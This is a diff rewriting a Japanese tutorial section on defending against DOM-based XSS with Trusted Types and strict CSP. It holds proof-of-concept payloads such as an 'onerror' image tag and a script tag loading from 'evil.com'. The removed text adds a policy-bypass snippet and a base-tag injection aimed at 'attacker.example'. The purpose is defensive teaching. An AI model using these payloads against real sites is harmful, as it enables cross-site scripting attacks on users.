@@ -1,169 +1,192 @@
 ## Trusted Types / strict CSP
 
-DOMベースXSSの最大の問題は、「文字列」という信頼できない値がそのまま `innerHTML` や `eval` のような**sink**（入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`、`document.write`、`Function`、`script.src` など）に流れ込んでしまう構造そのものにある。どれだけ入力検証やサニタイズのルールを整備しても、コードベースのどこか一箇所でも「未検証の文字列をsinkに渡す」コードが混入すれば、そこがXSSになる。**Trusted Types** は、この問題を「言語仕様・ブラウザAPIのレベル」で構造的に解決しようとするW3Cの仕様であり、Content Security Policy(CSP)の `require-trusted-types-for` ディレクティブと組み合わせることで、DOM XSSを機構的に不可能にする防御である。本節ではTrusted Typesの仕組みと、それを支える"strict CSP"（strict-dynamicベースの堅牢なCSP設計）を体系的に学ぶ。
+これまでの章では、`innerHTML` への未検証な文字列代入や `eval` 系APIの誤用といった **DOM-based XSS**、そしてそれを防ぐはずの **CSP（Content Security Policy）** が現実には97%近くバイパス可能である事情（「CSP Is Dead」論文、第4章参照）を見てきました。CSPの `script-src`／`object-src` によるホワイトリストは「どのスクリプトを実行してよいか」をURLやハッシュで宣言する仕組みですが、これはあくまで**スクリプトの出どころ**を制限するものであり、「アプリのコード自身が信頼できない文字列をDOM XSSシンクに流し込む」というバグそのものは塞ぎません。本節で扱う **Trusted Types** は、この「コードの出どころ」問題ではなく「**シンクに渡る値の型**」問題に踏み込んで、DOM-based XSSをブラウザレベルで構造的に潰そうとする、比較的新しいWebプラットフォームのセキュリティ機構です。
 
-### 1. Trusted Typesとは何か、なぜ必要か
+### Trusted Typesが解決しようとしている問題
 
-#### 1.1 従来の防御の限界
-
-サニタイズライブラリ（DOMPurifyなど）を使っていても、次のようなコードは開発者が気づかないままリポジトリに紛れ込みうる。
+Googleの分析によれば、2020年前後の実世界のXSS脆弱性のうち相当割合が「反射型／格納型」ではなく、クライアントサイドJavaScript自身が原因のDOM-based XSSでした。典型的な脆弱パターンは次のようなものです。
 
 ```javascript
-// どこか別のファイルで、レビューを通り抜けたコード
-element.innerHTML = userSuppliedString; // サニタイズ漏れ
+// 攻撃者が制御できる可能性のある値を、
+// そのまま危険なシンクに渡している
+element.innerHTML = location.hash.slice(1);
 ```
 
-この種の「danger sinkへの生文字列代入」は、静的解析やlintでは検出漏れが起きやすく、大規模なコードベース（数百〜数千ファイル）では特に深刻になる。従来のCSPの `script-src` は「どのスクリプトを実行してよいか」を制御するが、**DOM API経由で新たにDOM要素やインラインイベントハンドラを注入する攻撃（DOM XSS）そのものを直接止める仕組みではない**。
+`innerHTML` に代入された文字列は、ブラウザの**HTMLパーサ**によって再解釈され、`<img src=x onerror=alert(1)>` のようなペイロードがそのままDOM要素として構築されてしまいます。これは「文字列としては正しいデータだが、実行コンテキストに置かれた瞬間にコードとして再解釈される」という、XSSに共通する構造的な脆弱性です。
 
-#### 1.2 Trusted Typesの基本アイデア
+Trusted Typesのアイデアは単純です。**「危険なシンク（sink）関数に、生の文字列（string）を渡すこと自体を、ブラウザのレベルで禁止する」**。そのうえで、文字列の代わりに `TrustedHTML` / `TrustedScript` / `TrustedScriptURL` という特別なラッパー型のオブジェクトだけをシンクに渡せるようにし、そのラッパーオブジェクトは開発者が明示的に定義した「**ポリシー（policy）**」関数を通してしか生成できないようにします。つまり、アプリ内で文字列がシンクに到達しうる経路を、あらかじめ定義された少数のポリシー関数に強制的に集約させるわけです。
 
-Trusted Typesは、ブラウザの危険なDOM API（sink）の引数として「生の文字列(string)」を受け付けなくし、代わりに**専用のオブジェクト型**（`TrustedHTML`、`TrustedScript`、`TrustedScriptURL`）のみを受け付けるように強制する。これらのオブジェクトは、開発者が明示的に定義した**ポリシー(Policy)**関数を通してしか生成できない。
+> 出典: web.dev — Trusted Types — https://web.dev/articles/trusted-types
+
+### 危険なシンク関数の一覧
+
+Trusted Typesが監視対象とするDOM XSSシンクは、大きく次のカテゴリに分かれます。
+
+- **HTML注入系**: `Element.innerHTML`、`Element.outerHTML`、`Element.insertAdjacentHTML()`
+- **ドキュメント書き換え系**: `document.write()`、`document.writeln()`
+- **パーサ呼び出し系**: `DOMParser.parseFromString()`
+- **`<script>` 要素の内容設定**: `HTMLScriptElement` のテキストコンテンツやsrc属性
+- **プラグイン実行系**: `<embed src>`、`<object data>`
+- **動的コード実行系**: `eval()`、`setTimeout()`／`setInterval()`（文字列を渡す形式）、`new Function()`
+
+これらはすべて「文字列 → ブラウザ内部でのコード／マークアップとしての再解釈」という同じ危険パターンを持つため、Trusted Typesはこれらの引数の型シグネチャを、単なる `string` から `TrustedHTML` や `TrustedScript` などに置き換えます。ブラウザは、これらのシンクに素の文字列が渡されると、Trusted Types強制モードでは **`TypeError` を投げて実行を止めます**。
+
+### CSPディレクティブによる有効化
+
+Trusted Typesは新しいCSPディレクティブとして提供されます。導入は通常2段階で行います。
+
+**第1段階: `Report-Only` モードで違反を可視化する**
+
+```
+Content-Security-Policy-Report-Only: require-trusted-types-for 'script';
+  report-uri //my-csp-endpoint.example
+```
+
+このヘッダはページの動作をブロックせず、「もし enforcing モードだったらブロックされていたはずの箇所」をレポートとして送信するだけです。既存の大規模アプリでは、どこにどれだけ危険なシンク呼び出しが残っているか事前に把握できないことが多いため、まずreport-onlyで全違反を洗い出すのが定石です。
+
+**第2段階: 違反箇所を修正したうえで `enforcing` モードに切り替える**
+
+```
+Content-Security-Policy: require-trusted-types-for 'script';
+  report-uri //my-csp-endpoint.example
+```
+
+`require-trusted-types-for 'script'` が指定されると、対象ページ内のすべての危険シンクは、生の文字列ではなくTrusted Type値しか受け付けなくなります。さらに `trusted-types` ディレクティブを組み合わせることで、「そのページ上でどの名前のポリシーの作成を許可するか」を宣言できます（後述）。
+
+`require-trusted-types-for` は**サイト全体ではなく個々のドキュメント（HTMLレスポンス）単位**で効きます。したがって、機能を段階的にロールアウトしたいアプリケーションは、ページ単位でこのヘッダを有効化していくことができます。
+
+### なぜ仕組みとして有効なのか——ポリシーへの集約
+
+Trusted Typesが強力なのは、「シンクに到達する経路を1か所に集約させる」設計にあります。ポリシーはTrusted Typeオブジェクトのファクトリであり、次のように作成します。
 
 ```javascript
-// ポリシーを作成する（アプリ起動時に一度だけ）
-const policy = trustedTypes.createPolicy('my-policy', {
-  createHTML: (input) => DOMPurify.sanitize(input),
-});
-
-// ポリシー経由でTrustedHTMLオブジェクトを生成
-const safeHTML = policy.createHTML(userSuppliedString);
-
-// sinkにはTrustedHTML型オブジェクトしか渡せない
-element.innerHTML = safeHTML; // OK
-element.innerHTML = userSuppliedString; // TypeErrorで例外、実行時に検出される
+if (window.trustedTypes && trustedTypes.createPolicy) {
+  const escapeHTMLPolicy = trustedTypes.createPolicy('myEscapePolicy', {
+    createHTML: string => string.replace(/</g, '&lt;')
+  });
+}
 ```
 
-`element.innerHTML = userSuppliedString` のように生文字列を直接渡そうとすると、ブラウザが `TypeError` を投げて代入自体を拒否する。これは**「実行時に強制されるコンパイルエラーのようなもの」**であり、サニタイズ漏れのコードがあっても、本番環境やCI上のテストで例外として顕在化する。つまりTrusted Typesは「バグを未然に防ぐ」というより「バグを検出可能にする（サイレントな脆弱性を作らせない）」ための仕組みだと理解するのが正確である。
+`createPolicy()` の第一引数はポリシー名、第二引数はルールオブジェクトです。ルールオブジェクトに定義できるメンバーは `createHTML`／`createScript`／`createScriptURL` の3つで、それぞれ対応するTrusted Type（`TrustedHTML`／`TrustedScript`／`TrustedScriptURL`）を生成する関数です。重要なのは、**これらの関数自体は普通の文字列を返してよい**という点です。ブラウザは、ポリシー経由で返された文字列を自動的に対応するラッパー型でラップして返します。つまりセキュリティ上の意味は「関数の戻り値が安全であること」ではなく「**その文字列がこのポリシー関数を通過したという証跡があること**」にあります。
 
-> ⚠️ **未取得の資料**: 「web.dev: Prevent DOM-based cross-site scripting vulnerabilities with Trusted Types」は自動取得できませんでした（理由: 環境のegressプロキシによりweb.devドメインへのアクセスがブロックされたため）。以下のURLからユーザーご自身で直接ご覧ください: https://web.dev/articles/trusted-types
->
-> （以下は未取得資料の補足として一般知識およびWeb検索で得た断片情報に基づく解説です）
+```javascript
+const escaped = escapeHTMLPolicy.createHTML('<img src=x onerror=alert(1)>');
+console.log(escaped instanceof TrustedHTML);  // true
+el.innerHTML = escaped;  // 実際にDOMに入るのは '&lt;img src=x onerror=alert(1)>'
+```
 
-上記記事の要旨（Web検索結果からも裏付けられる内容）として、Trusted Types APIは「入力を、実行される可能性のあるAPIに渡す前に、開発者が指定した変換関数を必ず通過させる」ことを保証する仕組みであり、`trustedTypes.createPolicy()` によって作られたポリシーだけが `TrustedHTML` / `TrustedScript` / `TrustedScriptURL` を生成できる。有効なTrusted Typeオブジェクトは必ずいずれかのポリシーに由来するため、**アプリ全体のDOM XSS攻撃対象領域(attack surface)を「ポリシー定義部分」だけに縮小できる**という点が最大の利点である。裏を返せば、レビューやセキュリティ監査の労力も、全コードベースからポリシー定義箇所のみに絞り込める。
+ここでの `escaped` は生の文字列ではなく `TrustedHTML` インスタンスなので、`el.innerHTML = escaped` はTrusted Types強制下でも許可されます。逆に `el.innerHTML = someRawString` のようにポリシーを経由しない文字列を直接渡すコードは、強制モードで即座に `TypeError` になります。
 
-#### 1.3 対象となるsink（危険なDOM API）
+この仕組みが効くのは、**「ポリシー内のロジックが壊れていない限り」** という前提があるからです。言い換えると、Trusted Typesはアプリ全体に散らばっていた「文字列→シンク」の危険な経路を、開発者が明示的に作った少数の `createHTML`/`createScript`/`createScriptURL` 実装に強制的に集約させます。セキュリティレビューやコードオーディットは、アプリ全体を洗うのではなく、**このポリシー関数群だけを重点的に見ればよい**ことになります。web.dev の記事はこれを「enforcement後はDOM XSSの攻撃対象領域がポリシーコード内に限定される」と表現しています。
 
-Trusted Typesが介入する代表的なsinkは以下の通りである。
+### `default` ポリシーとサニタイザ統合
 
-| カテゴリ | 対象sink | 要求される型 |
+すべての `innerHTML` 代入箇所を手作業でポリシー呼び出しに書き換えるのは、大規模な既存コードベースでは現実的でないことがあります。そのための例外的な仕組みが **`default` という予約名のポリシー** です。名前が `default` のポリシーを一つ定義しておくと、ポリシーを経由せずに素の文字列がシンクに渡された場合、ブラウザはまずこの `default` ポリシーを暗黙に適用してからシンクに渡します。
+
+```javascript
+if (window.trustedTypes && trustedTypes.createPolicy) {
+  trustedTypes.createPolicy('default', {
+    createHTML: (string, sink) =>
+      DOMPurify.sanitize(string, { RETURN_TRUSTED_TYPE: true })
+  });
+}
+```
+
+ここで使われている **DOMPurify**（第4章で扱ったHTMLサニタイズライブラリ）は `RETURN_TRUSTED_TYPE: true` オプションに対応しており、サニタイズ結果を生文字列ではなく `TrustedHTML` として返せます。これにより、「既存コードは書き換えずに、シンクに到達するすべての文字列を自動的にサニタイズにかける」という後方互換的な導入経路が成立します。
+
+ただし、web.dev の記事は明確に注意を添えています。**default policyはあくまで移行期の便法であり、恒久的な設計としては個々の呼び出し箇所を専用ポリシーにリファクタリングするほうが望ましい**、という趣旨です。理由は、default policyがアプリ内のすべての未分類の文字列を一手に引き受けてしまうため、「本来は文字列を通すべきでない完全に信頼できないシンク呼び出し」までもがサニタイズさえ通ればブロックされずに素通りしてしまう、粒度の粗さにあります。さらに、サニタイズロジック自体にバグがあれば（第4章のmXSSやDOMPurifyのミューテーションXSSの議論を参照）、Trusted Typesを導入していてもDOM-based XSSは残存しうる、という限界も明記されています。
+
+### 違反レポートの取得方法
+
+Trusted Types違反は、CSP違反と同じ `securitypolicyviolation` イベント、またはより汎用的な `ReportingObserver` API で捕捉できます。
+
+```javascript
+const observer = new ReportingObserver((reports, observer) => {
+  for (const report of reports) {
+    if (report.type !== 'csp-violation' ||
+        report.body.effectiveDirective !== 'require-trusted-types-for') {
+      continue;
+    }
+    const violation = report.body;
+    console.log('Trusted Types Violation:', violation);
+  }
+}, { buffered: true });
+observer.observe();
+```
+
+`buffered: true` を指定すると、オブザーバー登録より前に発生していた違反もバッファから取得できます。`report.body.effectiveDirective` が `'require-trusted-types-for'` であるものだけをフィルタすることで、通常のCSP違反（`script-src` 違反など）と区別してTrusted Types固有の違反だけを収集できます。本番導入の実務では、これをサーバーサイドの `report-uri`／`report-to` エンドポイントで集約し、report-onlyフェーズでの「未対応シンク一覧」の洗い出しに使います。
+
+> 出典: web.dev — Trusted Types — https://web.dev/articles/trusted-types
+
+### ブラウザ対応状況（2026年時点）
+
+Trusted Typesは長らくChromium系ブラウザだけの機能でしたが、対応状況は近年大きく前進しています。
+
+| ブラウザ | 対応バージョン | 対応時期 |
 |---|---|---|
-| HTML注入 | `Element.innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `document.writeln`, `DOMParser.parseFromString` (一部) | `TrustedHTML` |
-| スクリプト実行 | `Function()` コンストラクタ, `eval()`, `setTimeout(string)`, `setInterval(string)` | `TrustedScript` |
-| スクリプトURL | `HTMLScriptElement.src`, `Worker()`, `SharedWorker()`, `<iframe>` の一部属性 | `TrustedScriptURL` |
+| Chrome / Edge | 83以降 | 2020年5月 |
+| Safari | 26以降 | 2025年9月 |
+| Firefox | 対応版以降 | 2026年2月 |
 
-これらは全て、歴史的にDOM XSSの主要な原因となってきたAPI群である。Trusted Typesが有効化された環境では、これらのsinkに生文字列を渡すと例外が発生する（`require-trusted-types-for 'script'` が有効な場合）。
+Firefoxが2026年2月に対応したことで、Trusted Typesは主要4ブラウザすべてで動作する **Baseline**（Web機能の相互運用性を示すステータス）に到達しました。未対応ブラウザ向けには公式のポリフィル（`w3c/trusted-types` リポジトリで提供）が用意されており、`trustedTypes` オブジェクトが存在しない環境でもポリシー生成コードを分岐なく書けるようにできます。
 
-### 2. CSPによる強制: `require-trusted-types-for` と `trusted-types`
+```javascript
+if (window.trustedTypes && trustedTypes.createPolicy) {
+  // Trusted Types対応ブラウザのみ実行
+}
+```
 
-Trusted Types APIそのものは「ポリシーを定義する仕組み」を提供するだけであり、**それを使うかどうかは開発者の任意**である。この「任意性」を強制に変えるのがCSPの2つのディレクティブである。
+この `window.trustedTypes && trustedTypes.createPolicy` という feature-detection パターンは、web.devの例でも一貫して使われており、未対応ブラウザではこのブロックがまるごとスキップされて通常のDOM操作にフォールバックする、後方互換な書き方になっています。
+
+### `trusted-types` ディレクティブによるポリシー名の制限
+
+`require-trusted-types-for 'script'` だけでは「どのコードがどんな名前のポリシーを作れるか」までは制限されません。攻撃者がインジェクションによって独自の `default` という名前のポリシーを新たに登録できてしまえば、正規のポリシーを上書き（あるいは先取り）して攻撃者の任意のcreateHTML実装を仕込む「**ポリシー注入**」が理論上可能になります。これを防ぐのが `trusted-types` ディレクティブです。
 
 ```
 Content-Security-Policy:
   require-trusted-types-for 'script';
-  trusted-types my-policy dompurify-policy;
+  trusted-types myEscapePolicy default;
 ```
 
-- **`require-trusted-types-for 'script'`**: これを指定すると、ブラウザは危険なsink（前節の表）が生文字列を受け取ることを一律で拒否するようになる。これが「強制」の本体である。
-- **`trusted-types <許可ポリシー名のリスト>`**: どのポリシー名を `createPolicy()` で作成してよいかをホワイトリスト化するディレクティブ。これにより、攻撃者が仮に任意コード実行の糸口（例えば `<script>` タグの挿入以外の経路）を得たとしても、勝手に独自の「何でも許すポリシー」（`createHTML: (s) => s` のような無検証ポリシー）を作成して防御を無力化することを防げる。名前が指定されていないポリシーの `createPolicy()` 呼び出しは例外を投げて失敗する。
-- **`trusted-types 'allow-duplicates'`**: 同名ポリシーの複数回作成を許可する特殊キーワード。開発中やホットリロード環境では便利だが、本番では攻撃者に同名ポリシーの上書き（後述するpolicy overrideの脆弱性クラス）を許す可能性があるため、通常は付けない。
+このように許可するポリシー名を明示的に列挙しておくと、リストにない名前で `createPolicy()` を呼んでもブラウザは例外を投げて拒否します。さらに `trusted-types` ディレクティブに `'allow-duplicates'` を指定しない限り、同名のポリシーを二重登録することもデフォルトで禁止されます。これにより、「攻撃者が任意のJS実行を1回だけ得たとしても、既存のポリシー名を乗っ取ることはできない」という追加の防御層が成立します。
 
-> Trusted TypesのCSPディレクティブが**評価される仕組み**は、通常の `script-src` などのソース許可評価（URLやハッシュ・nonceとの文字列比較）とは異なり、**JavaScript実行時にDOM API呼び出しをフックし、渡された値の内部型タグ（ブランド）を検査する**という点に注意したい。CSPパーサーが静的にHTMLを解析するのではなく、ブラウザのDOM実装内部でsink呼び出しのたびに動的にチェックが入る。これはXSS対策の中でも「実行時強制型（runtime enforcement）」に分類される防御であり、静的なホワイトリスト評価しか行わない従来のCSPディレクティブより一段深いレイヤーで動作する。
+### Lighthouseの監査項目「Trusted Types」
 
-#### 2.1 デフォルトポリシー(default policy)
+Chrome DevToolsに統合された監査ツール **Lighthouse** には、Best Practices カテゴリの一項目として "Mitigate DOM-based XSS with Trusted Types"（DOM-based XSSをTrusted Typesで緩和する）という監査が存在します。この監査は、レスポンスのCSPヘッダを検査し、`require-trusted-types-for` ディレクティブが設定されているかどうかを機械的にチェックします。
 
-サードパーティライブラリなど、Trusted Typesに対応していないコードが `element.innerHTML = str` のような呼び出しを行う場合に備え、名前を `'default'` としたポリシーを1つだけ定義できる。
+監査に合格するための最小要件は、次のヘッダをページのCSPに含めることです。
 
-```javascript
-trustedTypes.createPolicy('default', {
-  createHTML: (input) => {
-    // 全ての生文字列innerHTML代入がここを通過する
-    return DOMPurify.sanitize(input);
-  },
-});
+```
+Content-Security-Policy: require-trusted-types-for 'script';
 ```
 
-`default` ポリシーが存在すると、Trusted Types未対応コードからの生文字列代入は例外を出さず、自動的にこのポリシーを通過してから実行される。移行期（レガシーコードとの共存期間）に有用だが、**全てのHTML注入がこの1つのサニタイズ関数に依存することになるため、そのサニタイズ関数自体にバグがあれば防御全体が崩れる**という一点集中リスクがある点に注意。
+Chrome開発者ドキュメントの説明では、Trusted Typesは「危険なインジェクションポイント（`.innerHTML` など）で未検証の文字列が使われることをブロックする、Webプラットフォームのセキュリティ機能」と位置づけられています。監査自体はヘッダの**有無**を機械的に見るだけであり、ポリシー内部のサニタイズロジックの妥当性までは検証しません。したがって、この監査に合格していること自体は「Trusted Typesが有効化されている」ことの証明にはなっても、「default policyの実装が安全である」ことの証明には**なりません**——ここは監査結果を過信しないうえで押さえておくべき注意点です。
 
-### 3. 攻撃者視点: Trusted Typesの回避手法
+> 出典: Chrome for Developers — Trusted Types（Lighthouse Best Practices） — https://developer.chrome.com/docs/lighthouse/best-practices/trusted-types-xss
 
-Trusted Typesは強力だが、「導入されていれば絶対に安全」というわけではない。実務・バグバウンティで観測される回避パターンを整理する。
+### strict CSPとの関係——両者は補完関係にある
 
-#### 3.1 ポリシー名の推測・再利用によるバイパス
+第4章で見た「strict CSP」（`'strict-dynamic'` とnonce/hashを組み合わせたCSP）は、「**どのスクリプトの実行を許可するか**」という出所ベースの制御でした。一方Trusted Typesは、「**アプリ自身のコードが、信頼できない文字列を危険なシンクに渡すこと自体**」を防ぐ、実行時の型制約です。両者が対象とする攻撃面は重なりません。
 
-アプリが `trusted-types` ディレクティブで複数のポリシー名を許可しており、かつそのうちの1つが「入力をそのまま返す」ような緩いポリシー（デバッグ用、サードパーティ製ライブラリ互換用など）だった場合、攻撃者はJavaScript実行のプリミティブ（例えばプロトタイプ汚染や別のDOM XSSギャジェット）を経由して、その緩いポリシーを呼び出すだけでサニタイズをバイパスできる。
+- strict CSPだけを導入した場合: 攻撃者が外部から `<script src=//evil.com>` を注入するタイプの攻撃(第三者スクリプトの持ち込み)は防げますが、アプリ自身のコードが `el.innerHTML = userInput` のようにDOM-based XSSを埋め込んでいれば、そのコードは「正規のインラインスクリプト」として実行されてしまうため無力です。
+- Trusted Typesだけを導入した場合: DOM-based XSSのシンク経路は塞げますが、サーバーサイドの反射型XSSのように、そもそも攻撃者の `<script>` タグがマークアップとしてページに書き出されてしまうケースまでは防げません（それを防ぐのはCSPの `script-src` 側の役割です）。
 
-```javascript
-// アプリがデバッグ用に緩いポリシーを許可していた場合
-const p = trustedTypes.getExposedPolicy ? trustedTypes.getExposedPolicy('legacy-noop') : null;
-// あるいは既存ポリシーオブジェクトへの参照を何らかの経路で取得し、
-// policy.createHTML('<img src=x onerror=alert(1)>') を呼び出す
-```
-
-これが動く理由は、**Trusted Types自体は「どのポリシーが安全な実装か」を検証しない**ためである。ポリシー名をホワイトリストに載せる `trusted-types` ディレクティブは「誰が新規にポリシーを作成できるか」を制限するものであり、既に作られたポリシー実装のロジックの安全性までは保証しない。したがって、緩い実装のポリシーが1つでも存在すれば、それを呼び出せる経路がある限り防御は崩れる。
-
-#### 3.2 `default`ポリシーの未定義によるサイレント許可の誤解
-
-`require-trusted-types-for 'script'` が有効でも `default` ポリシーが定義されていない場合、Trusted Types未対応のサードパーティスクリプトが `innerHTML` に生文字列を代入しようとすると**例外が発生してその代入は失敗する**（サイレントに許可されるわけではない）。しかし、開発者が「動くから安全」と誤解し、エラーを握りつぶす `try/catch` でラップしてしまうと、機能は壊れたまま気づかれず、結果として`default`ポリシーを急いで追加する際に検証が甘くなりがちである。この運用上の落とし穴は実務でよく見られる。
-
-#### 3.3 DOM Clobbering・プロトタイプ汚染との組み合わせ
-
-Trusted Typesは「sinkに渡る値の型」を検査するが、**ポリシー関数自身のロジックにDOM Clobbering**（HTML要素の `id`/`name` 属性によってグローバル変数やDOMプロパティを意図せず上書きする手法）**やプロトタイプ汚染の影響が及ぶ場合**、ポリシー関数が誤ったサニタイズ結果を返す余地が生まれる。例えばポリシー内部で `Object.prototype` のメソッドや、グローバルに公開された設定オブジェクトのプロパティを参照している場合、事前にプロトタイプ汚染で該当プロパティを書き換えておけば、サニタイズ処理の分岐を狂わせられる可能性がある。Trusted Types自体はこの種の間接攻撃を防がないため、ポリシー実装は外部から汚染されうるグローバル状態に依存しないよう設計する必要がある。
-
-#### 3.4 Trusted Types非対応ブラウザでの防御無効化（フォールバック問題）
-
-Trusted TypesはBaseline化が進んでいるものの、対応が最終的に揃ったのは比較的最近である（Web検索結果によれば、Firefoxが2026年2月に対応を完了し、主要ブラウザ全体でBaselineとなったとされる）。したがって、Trusted Types自体はブラウザの機能検出に基づく段階的強化(progressive enhancement)として設計されており、**未対応の古いブラウザやTrusted Types機能を無効化した環境では、CSPの `require-trusted-types-for` ディレクティブ自体が単に無視され、生文字列のsink代入がそのまま通ってしまう**。これはTrusted Types自体の欠陥ではないが、「CSPヘッダーにTrusted Typesを設定したから安全」という早合点は禁物であり、**Trusted Typesは他の防御（strict CSPのscript-src側、入力バリデーション）と重ねて使うべき多層防御の一部**として理解する必要がある。
-
-### 4. strict CSP（`strict-dynamic` + nonce/hash）との関係
-
-Trusted Typesは「DOM API経由でのHTML/スクリプト注入」を防ぐが、そもそも**攻撃者が任意の `<script>` タグをHTMLレスポンスに直接挿入できるサーバサイドXSS（反射型・格納型）**には無力である。これを防ぐのがCSPの `script-src` 側での**strict CSP**設計であり、両者は補完関係にある。
-
-strict CSPの核心は、URLホワイトリスト方式（`script-src https://cdn.example.com`）を捨て、**nonceまたはhashベースの許可**に切り替える点にある。
+したがって実務上の到達点は、**strict CSPで「未承認スクリプトの実行」を止め、Trusted Typesで「アプリ自身のコードが引き起こすDOM-based XSS」を止める**、という二層防御の組み合わせです。CSPヘッダに両方のディレクティブを同時に指定すること自体は問題なく可能です。
 
 ```
 Content-Security-Policy:
-  script-src 'nonce-r4nd0mBase64Value' 'strict-dynamic';
-  object-src 'none';
-  base-uri 'none';
+  script-src 'nonce-RANDOM123' 'strict-dynamic';
+  object-src 'none'; base-uri 'none';
+  require-trusted-types-for 'script';
+  trusted-types default;
 ```
 
-- **`'nonce-...'`**: サーバがレスポンスごとにランダム生成したnonce値を `<script nonce="r4nd0mBase64Value">` に埋め込む。CSPはこのnonce値が一致するスクリプトタグのみ実行を許可する。攻撃者は各リクエストごとに変わるこの値を事前に予測できないため、たとえHTMLインジェクション（反射型XSSの入口）が起きても、攻撃者が挿入した `<script>` タグにはnonceが付与できず実行されない。
-- **`'strict-dynamic'`**: nonceやhashで許可された「信頼できるスクリプト」が動的に生成・挿入する追加のスクリプト（例: バンドローダーが後続チャンクを `document.createElement('script')` で挿入するようなケース）にも信頼を伝播させるキーワード。これがないと、モダンなバンドラー（webpackのコード分割等）を使うアプリでCSPが機能しなくなる。`strict-dynamic` が指定されている場合、URLベースの許可リスト（`https:` や特定ドメイン）は**無視される**という仕様上の挙動があり、これによりホワイトリスト方式にありがちな「JSONPエンドポイントやオープンリダイレクトを経由したCSPバイパス」というクラスの攻撃を根本的に排除できる。
-- **`object-src 'none'`**: `<object>`/`<embed>` 経由でのFlashなどのプラグインベースのXSS（レガシー環境で問題になった）を塞ぐ。
-- **`base-uri 'none'`**: `<base href="https://attacker.example/">` によるsrc相対パスの乗っ取り（base tag injection）を防ぐ。nonce方式のCSPは「正しいnonceが付いたスクリプトタグ」のみを信頼するが、ページ内の相対パスの基準を書き換えられると、意図しないリソースを読み込ませられる場合があるため、この防御を必ず併用する。
+### 導入フローのまとめ
 
-#### なぜURLホワイトリスト方式は脆弱なのか（原理）
+1. **Report-Onlyで観測**: `require-trusted-types-for 'script'` をreport-onlyヘッダで先行導入し、`report-uri`／`ReportingObserver` で違反箇所を洗い出す。
+2. **危険シンクの棚卸し**: `innerHTML`／`document.write`／`eval` などの呼び出し箇所を特定し、可能な限り安全なAPI（`textContent`、`setAttribute` など）への置き換え、またはDOMPurifyのような検証済みサニタイザを介したポリシー呼び出しに書き換える。
+3. **ポリシーの命名と制限**: `trusted-types` ディレクティブで許可するポリシー名を明示的に宣言し、ポリシー注入・二重登録を防ぐ。
+4. **段階的にenforcingへ移行**: すべての既知の違反が解消されたことを確認したうえで、`Content-Security-Policy-Report-Only` から `Content-Security-Policy` に切り替える。
+5. **strict CSPと併用**: `script-src` 側のホワイトリスト回避（第4章参照）を防ぐため、nonceベースのstrict CSPと組み合わせて多層防御とする。
 
-`script-src https://cdn.example.com https://*.googleapis.com` のようなホワイトリスト方式は、CSPが「文字列としてのオリジンマッチ」しか見ていないことに起因する構造的な弱点を抱える。許可された巨大なCDNやクラウドサービスのドメイン配下に、攻撃者が制御可能なJSONPエンドポイント、オープンリダイレクト、あるいはユーザーアップロード可能なファイル領域（GCS/S3バケット等）が1つでも存在すれば、そこを踏み台にして任意のJavaScriptを「許可されたオリジンから」読み込ませることができる。これは2015年前後からGoogle等の研究で繰り返し指摘されてきた、**ホワイトリスト方式CSPのバイパス手法として広く知られる問題である**。nonceベースのstrict CSPはこの「オリジン単位の粗い許可」ではなく、「サーバが発行した個別のトークン単位の許可」に切り替えることで、この攻撃クラスを構造的に排除する。
-
-> ⚠️ **未取得の資料**: 「Chrome for Developers: Mitigate DOM-based XSS with Trusted Types (Lighthouse)」は自動取得できませんでした（理由: 環境のegressプロキシによりdeveloper.chrome.comドメインへのアクセスがブロックされたため）。以下のURLからユーザーご自身で直接ご覧ください: https://developer.chrome.com/docs/lighthouse/best-practices/trusted-types-xss
->
-> （以下は未取得資料の補足として一般知識およびWeb検索で得た断片情報に基づく解説です）
-
-Web検索結果から確認できた要点として、Lighthouseの「trusted-types-xss」監査項目は、**レスポンスのCSPヘッダーに `require-trusted-types-for` ディレクティブが `script` を値として含む形で設定されているかどうか**を機械的にチェックするものであり、設定されていない場合、あるいはCSPヘッダー自体が存在しない場合に監査failとなる。これはLighthouseの「ベストプラクティス」カテゴリの一項目として、サイト運営者がTrusted Types導入状況を継続的に可視化・追跡できるようにする目的で提供されている。関連する別の監査項目「csp-xss」は、strict CSP（nonce/hashベースかつ `'unsafe-inline'` を含まない設計）が実際に有効かどうかをより広く評価するものであり、両者は「sinkレベルの防御(Trusted Types)」と「スクリプト注入経路レベルの防御(strict CSP)」という異なるレイヤーを補完的にチェックしていると理解してよい。
-
-### 5. 導入戦略と実務上の注意点
-
-1. **段階的導入(Report-Onlyモード)**: `require-trusted-types-for` にはReport-Onlyモードが存在する。
-
-   ```
-   Content-Security-Policy-Report-Only:
-     require-trusted-types-for 'script';
-     report-uri /csp-violation-report
-   ```
-
-   これにより、実際にsink呼び出しをブロックせず「どこで違反が発生するか」だけをレポートさせ、既存コードの改修範囲を洗い出してから本番強制(enforce)に移行できる。
-
-2. **ライブラリ対応状況の確認**: DOMPurifyは公式にTrusted Types出力オプション(`RETURN_TRUSTED_TYPE: true`)を持つなど対応が進んでいるが、対応していないサードパーティスクリプトが多いアプリでは`default`ポリシーへの依存度が高くなり、前述のリスクを抱える。
-
-3. **フレームワーク側のサポート**: Angularは早くからTrusted Types対応を組み込んでおり、Reactも `dangerouslySetInnerHTML` 相当の箇所にポリシーを適用する運用が推奨される。新規プロジェクトではフレームワークのデフォルト設定でTrusted Types対応が有効になっているかを確認するのが効率的である。
-
-4. **CSPとTrusted Typesは"サーバ側インジェクション対策"の代替にはならない**: 繰り返しになるが、これらはあくまで「クライアントサイドでの実行系統をどう絞り込むか」という防御であり、テンプレートエンジンでのエスケープ処理やサーバサイドの出力エンコーディングを省略してよい理由にはならない。多層防御の一段として位置づけることが重要である。
-
-### まとめ
-
-- Trusted Typesは、危険なDOM sinkに生文字列を渡すことをブラウザレベルで禁止し、明示的なポリシー関数を通過した型付きオブジェクトのみを受理させることで、DOM XSSの攻撃対象領域を「ポリシー定義箇所」に限定する。
-- CSPの `require-trusted-types-for 'script'` がこの強制を有効化し、`trusted-types <名前リスト>` がポリシー作成自体をホワイトリスト制御する。
-- 防御バイパスは「緩いポリシーの悪用」「ポリシー内部ロジックへのプロトタイプ汚染・DOM Clobberingの影響」「未対応ブラウザでのフォールバック無視」という経路で起こりうる。導入していれば絶対安全、という誤解を避ける必要がある。
